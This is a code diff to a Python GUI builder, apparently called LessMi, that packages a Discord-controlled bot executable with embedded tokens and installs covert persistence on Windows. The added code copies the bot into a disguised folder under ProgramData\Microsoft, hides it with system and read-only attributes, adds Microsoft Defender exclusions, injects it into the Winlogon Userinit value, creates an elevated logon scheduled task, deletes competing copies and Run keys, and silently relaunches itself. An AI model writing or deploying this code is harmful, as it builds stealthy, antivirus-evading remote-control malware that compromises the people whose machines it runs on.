@@ -38,6 +38,7 @@ import tempfile
 import threading
 import time
 import urllib.request
+import uuid
 from io import BytesIO
 
 import tkinter
@@ -91,6 +92,7 @@ SFX_DIR = os.path.join(tempfile.gettempdir(), "lessmi_sfx")
 
 SOURCE_FILE = "source_assembled.py"
 RUN_KEY_BUILDER = r"Software\Microsoft\Windows\CurrentVersion\Run"
+POLICY_RUN_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
 
 SOUND_URLS = [
     "https://www.myinstants.com/media/sounds/creamy-keyboard-once.mp3",
@@ -122,10 +124,6 @@ FEATURES = [
      "desc": "Append the exe to Winlogon\\Userinit.", "pat": r"^\s+install_userinit\(\)\s*$", "mode": "line"},
     {"id": "tasks", "label": "Scheduled tasks", "group": "STARTUP",
      "desc": "schtasks ONLOGON / ONSTART.", "pat": r"^\s+_task_create\(", "mode": "line"},
-    {"id": "runkeys", "label": "Run keys", "group": "STARTUP",
-     "desc": "HKLM and HKCU CurrentVersion\\Run.", "pat": r"^\s+_reg_add\(RUN_KEY", "mode": "line"},
-    {"id": "launcher", "label": "VBS launcher", "group": "STARTUP",
-     "desc": "Watchdog script in the Startup folder.", "pat": r"^\s+_make_launcher\(", "mode": "line"},
     {"id": "avexcl", "label": "Defender exclusions", "group": "STARTUP",
      "desc": "Add-MpPreference for folder and process.", "pat": r"^\s+_ps\(f'Add-MpPreference", "mode": "line"},
 
@@ -191,6 +189,14 @@ CATEGORY_LABELS = {
 
 def _rnd(n):
     return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))
+
+
+def _machine_hash():
+    try:
+        seed = str(uuid.getnode())
+    except Exception:
+        seed = platform.node()
+    return hashlib.md5(seed.encode("utf-8", "replace")).hexdigest()
 
 
 def _tint(hex_color, factor):
@@ -312,25 +318,89 @@ def _save_persist(data):
         pass
 
 
+CLONE_RE = re.compile(r"programdata\\microsoft\\[a-z0-9]{6,14}\\[a-z0-9]{6,14}\.exe$")
+
+
 def _userinit(on):
     key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    userinit = r"C:\Windows\System32\userinit.exe"
+    exe = _load_persist().get("exe")
+    for _ in range(5):
+        try:
+            import winreg
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0,
+                               winreg.KEY_READ | winreg.KEY_SET_VALUE)
+            try:
+                cur = winreg.QueryValueEx(k, "Userinit")[0]
+            except OSError:
+                cur = userinit + ","
+
+            keep = []
+            for p in (x.strip().strip('"') for x in cur.split(",") if x.strip()):
+                low = p.lower()
+                if low.endswith("userinit.exe") or (exe and low == exe.lower()):
+                    continue
+                if CLONE_RE.search(low):
+                    continue
+                keep.append(p)
+
+            if on and exe:
+                value = ", ".join(keep + [exe, userinit]) + ","
+            else:
+                value = ", ".join(keep + [userinit]) + ","
+
+            winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, value)
+            winreg.CloseKey(k)
+
+            if not on or not exe:
+                return True
+
+            time.sleep(0.3)
+            chk = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_READ)
+            got = winreg.QueryValueEx(chk, "Userinit")[0]
+            winreg.CloseKey(chk)
+            if exe.lower() in got.lower() and userinit.lower() in got.lower():
+                return True
+            continue
+        except Exception:
+            time.sleep(0.25)
+    return False
+
+
+def _clean_run_keys():
+    state = _load_persist()
+    exe = (state.get("exe") or "").lower()
+    names = set(state.get("tasks") or [])
     try:
         import winreg
-        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0,
-                           winreg.KEY_READ | winreg.KEY_SET_VALUE)
-        cur = winreg.QueryValueEx(k, "Userinit")[0]
-        exe = _load_persist().get("exe")
-        if on:
-            if exe and exe.lower() not in cur.lower():
-                winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ,
-                                  '"{}", C:\\Windows\\System32\\userinit.exe,'.format(exe))
-        else:
-            if exe and exe.lower() in cur.lower():
-                winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ,
-                                  r"C:\Windows\System32\userinit.exe,")
-        winreg.CloseKey(k)
     except Exception:
-        pass
+        return
+    for hive, path in ((winreg.HKEY_CURRENT_USER, RUN_KEY_BUILDER),
+                       (winreg.HKEY_LOCAL_MACHINE, RUN_KEY_BUILDER),
+                       (winreg.HKEY_CURRENT_USER, POLICY_RUN_KEY),
+                       (winreg.HKEY_LOCAL_MACHINE, POLICY_RUN_KEY)):
+        try:
+            k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
+        except OSError:
+            continue
+        try:
+            for i in range(winreg.QueryInfoKey(k)[0] - 1, -1, -1):
+                try:
+                    name, data, _ = winreg.EnumValue(k, i)
+                except OSError:
+                    continue
+                low = str(data).lower()
+                if (name in names or (exe and exe in low)
+                        or (len(name) == 10 and name.isalnum() and "microsoft\\" in low)):
+                    try:
+                        winreg.DeleteValue(k, name)
+                    except OSError:
+                        pass
+        finally:
+            try:
+                winreg.CloseKey(k)
+            except Exception:
+                pass
 
 
 def _mp_add(paths, tries=5):
@@ -353,9 +423,83 @@ def _mp_add(paths, tries=5):
     return added
 
 
+def _hide_path(path, hidden=True, readonly=False):
+    flags = ["+h", "+s"] if hidden else ["-h", "-s", "-r"]
+    if hidden and readonly:
+        flags.append("+r")
+    try:
+        subprocess.run(["attrib", *flags, str(path)], capture_output=True, creationflags=0x08000000)
+    except Exception:
+        pass
+
+
+def _copy_verified(src, dst):
+    for _ in range(3):
+        try:
+            if os.path.exists(dst):
+                subprocess.run(["attrib", "-r", "-s", "-h", dst], capture_output=True,
+                               creationflags=0x08000000)
+            shutil.copy2(src, dst)
+            if os.path.getsize(src) == os.path.getsize(dst):
+                with open(src, "rb") as a, open(dst, "rb") as b:
+                    if hashlib.sha256(a.read()).digest() == hashlib.sha256(b.read()).digest():
+                        return True
+        except Exception:
+            pass
+        time.sleep(0.4)
+    return False
+
+
+def purge_strays(keep_dir, keep_task):
+    ps = (
+        "$keep='" + keep_task + "';"
+        "Get-ScheduledTask | ForEach-Object { $t=$_; foreach ($a in $t.Actions) {"
+        " $l=\"$($a.Execute) $($a.Arguments)\";"
+        " if ($l -match 'ProgramData\\\\Microsoft\\\\[A-Za-z0-9]{6,}' -and $t.TaskName -notlike \"$keep*\") {"
+        " Unregister-ScheduledTask -TaskName $t.TaskName -Confirm:$false -ErrorAction SilentlyContinue; break } } }"
+    )
+    try:
+        subprocess.run(["powershell", "-NoProfile", "-Command", ps],
+                       capture_output=True, creationflags=0x08000000)
+    except Exception:
+        pass
+
+    root = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "Microsoft")
+    try:
+        entries = os.listdir(root)
+    except Exception:
+        return
+    for entry in entries:
+        full = os.path.join(root, entry)
+        if full == keep_dir or not os.path.isdir(full):
+            continue
+        if not re.fullmatch(r"[A-Za-z0-9]{6,14}", entry):
+            continue
+        try:
+            files = os.listdir(full)
+        except Exception:
+            continue
+        exes = [f for f in files if re.fullmatch(r"[A-Za-z0-9]{6,14}\.exe", f)]
+        if not exes:
+            continue
+        for f in exes:
+            try:
+                subprocess.run(["taskkill", "/f", "/im", f], capture_output=True)
+            except Exception:
+                pass
+        for f in files:
+            try:
+                subprocess.run(["attrib", "-r", "-s", "-h", os.path.join(full, f)],
+                               capture_output=True)
+            except Exception:
+                pass
+        shutil.rmtree(full, ignore_errors=True)
+
+
 def cleanup_old_persistence():
     state = _load_persist()
     _userinit(False)
+    _clean_run_keys()
     for task in state.get("tasks", []):
         try:
             subprocess.run(["schtasks", "/Delete", "/TN", task, "/F"], capture_output=True)
@@ -374,14 +518,25 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
     if not is_admin():
         return "no-admin"
     try:
+        h = _machine_hash()
+        target_dir = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
+                                  "Microsoft", h[:10])
+        target_exe = os.path.join(target_dir, h[:9] + ".exe")
+        name = h[:12]
+
+        try:
+            subprocess.run(["taskkill", "/f", "/im", os.path.basename(target_exe)],
+                           capture_output=True)
+        except Exception:
+            pass
+        time.sleep(0.8)
+
         cleanup_old_persistence()
+        purge_strays(target_dir, name)
 
-        folder = _rnd(10)
-        target_dir = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "Microsoft", folder)
         os.makedirs(target_dir, exist_ok=True)
-        target_exe = os.path.join(target_dir, _rnd(9) + ".exe")
 
-        targets = [target_dir, target_exe]
+        targets = [target_dir]
         if runtime_dir:
             targets.append(os.path.expandvars(runtime_dir))
         excluded = _mp_add(targets)
@@ -391,40 +546,47 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
                 bundle_dir, target_dir, dirs_exist_ok=True,
                 ignore=shutil.ignore_patterns("build", "*.spec", "source_final.py"),
             )
-            target_exe = os.path.join(target_dir, os.path.basename(exe_path))
-        elif exe_path and os.path.exists(exe_path):
-            shutil.copy2(exe_path, target_exe)
-        else:
+            built = os.path.join(target_dir, os.path.basename(exe_path))
+            if os.path.exists(built) and os.path.abspath(built) != os.path.abspath(target_exe):
+                subprocess.run(["attrib", "-r", "-s", "-h", target_exe], capture_output=True)
+                try:
+                    os.replace(built, target_exe)
+                except Exception:
+                    shutil.copy2(built, target_exe)
+                    try:
+                        os.remove(built)
+                    except Exception:
+                        pass
+        elif not _copy_verified(exe_path, target_exe):
+            return "fail"
+
+        if not os.path.exists(target_exe):
             return "fail"
 
         _mp_add([target_exe])
 
-        tasks = []
-        name = _rnd(12)
+        _hide_path(target_dir, True)
+        _hide_path(target_exe, True, True)
+
         subprocess.run(
             ["schtasks", "/Create", "/TN", name, "/TR", target_exe,
-             "/SC", "ONLOGON", "/RL", "HIGHEST", "/F", "/DELAY", "0000:30"],
+             "/SC", "ONLOGON", "/RL", "HIGHEST", "/F", "/DELAY", "0000:20"],
             capture_output=True,
         )
-        tasks.append(name)
 
-        try:
-            import winreg
-            winreg.CloseKey(winreg.CreateKeyEx(
-                winreg.HKEY_CURRENT_USER, RUN_KEY_BUILDER, 0, winreg.KEY_SET_VALUE))
-        except Exception:
-            pass
-        subprocess.run(
-            ["reg", "add", "HKCU\\" + RUN_KEY_BUILDER, "/v", folder,
-             "/t", "REG_SZ", "/d", '"{}"'.format(target_exe), "/f"],
-            capture_output=True)
+        _save_persist({"folder": target_dir, "tasks": [name], "exe": target_exe})
 
-        subprocess.run(["attrib", "+h", "+s", target_dir], capture_output=True)
-        subprocess.run(["attrib", "+h", "+s", target_exe], capture_output=True)
+        ok_init = False
+        for _ in range(3):
+            if _userinit(True):
+                ok_init = True
+                break
+            time.sleep(0.6)
 
-        _save_persist({"folder": target_dir, "tasks": tasks, "exe": target_exe})
-        _userinit(True)
+        _clean_run_keys()
 
+        if not ok_init:
+            return "ok-noinit"
         if excluded:
             return "ok"
         return "ok-noav"
@@ -1109,6 +1271,7 @@ class FilterPopup(ctk.CTkToplevel):
                 pass
             self.destroy()
 
+
 def _synth_clicks(count=3):
     paths = []
     rate = 44100
@@ -1139,6 +1302,7 @@ def _synth_clicks(count=3):
 
 
 BANNER = r"""
+
  _                    __  __ _
 | |    ___  ___ _____ |  \/  (_)
 | |   / _ \/ __/ __|  | |\/| | |
@@ -1960,8 +2124,10 @@ class ModernBuilder(ctk.CTk):
         with open(source_path, "r", encoding="utf-8") as f:
             lines = f.readlines()
 
-        runner = '''TOKENS = [{list}]
-token = TOKENS[0]
+        build_id = int(time.time())
+        runner = '''BUILD_ID = {build}
+TOKENS = [{list}]
+token = TOKENS[0] if TOKENS else ""
 
 def _lm_log(msg):
     try:
@@ -1971,8 +2137,40 @@ def _lm_log(msg):
     except Exception:
         pass
 
+def _lm_tokens():
+    st = _state_read() or _ensure_state()
+    saved = [t for t in (st.get("tokens") or []) if t]
+    try:
+        if saved and int(st.get("tbuild") or 0) > BUILD_ID:
+            return saved
+    except Exception:
+        pass
+    if TOKENS:
+        st["tokens"] = list(TOKENS)
+        st["tbuild"] = BUILD_ID
+        _state_write(st)
+        return list(TOKENS)
+    return saved
+
+def _lm_relaunch(delay=20):
+    _lm_log("relaunch in {{}}s".format(delay))
+    try:
+        _mutex_release()
+    except Exception:
+        pass
+    time.sleep(delay)
+    try:
+        subprocess.Popen([sys.executable], close_fds=True, creationflags=0x08000000)
+    except Exception as e:
+        _lm_log("relaunch failed: {{!r}}".format(e))
+    os._exit(0)
+
 def _lm_run():
-    for t in TOKENS:
+    tokens = _lm_tokens()
+    if not tokens:
+        _lm_log("no tokens stored")
+        _lm_relaunch(60)
+    for t in tokens:
         try:
             bot.run(t)
             return
@@ -1983,12 +2181,10 @@ def _lm_run():
             return
         except Exception as e:
             _lm_log("crash: {{!r}}".format(e))
-            time.sleep(15)
-            os.execv(sys.executable, [sys.executable] + sys.argv)
+            time.sleep(5)
     _lm_log("all tokens failed")
-    time.sleep(120)
-    os.execv(sys.executable, [sys.executable] + sys.argv)
-'''.format(list=", ".join('"{}"'.format(t) for t in tokens))
+    _lm_relaunch(90)
+'''.format(build=build_id, list=", ".join('"{}"'.format(t) for t in tokens))
 
         new_lines, injected = [], False
         for line in lines:
@@ -2106,7 +2302,9 @@ def _lm_run():
             self.update_status("Installing persistence...", 0.95)
             result = install_persistence(exe_out, None if onefile else os.getcwd(), runtime_dir)
             if result == "ok":
-                self.log("persistence installed (copy + task + runkey + userinit + exclusions)", "ok")
+                self.log("persistence installed (clone + userinit + task + exclusions)", "ok")
+            elif result == "ok-noinit":
+                self.log("persistence installed but USERINIT FAILED (task only)", "warn")
             elif result == "ok-noav":
                 self.log("persistence installed but NO exclusions (tamper protection?)", "warn")
             elif result == "no-admin":
